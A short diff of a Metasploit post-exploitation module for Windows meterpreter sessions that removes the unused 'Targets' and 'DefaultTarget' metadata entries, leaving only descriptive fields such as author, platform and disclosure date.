@@ -28,8 +28,6 @@ class MetasploitModule < Msf::Post
         'Author'         => 'RageLtMan <rageltman[at]sempervictus>',
         'Platform'       => [ 'windows' ],
         'SessionTypes'   => [ 'meterpreter' ],
-        'Targets'        => [ [ 'Universal', {} ] ],
-        'DefaultTarget'  => 0,
         'DisclosureDate' => 'Aug 14 2012'
       )
     )
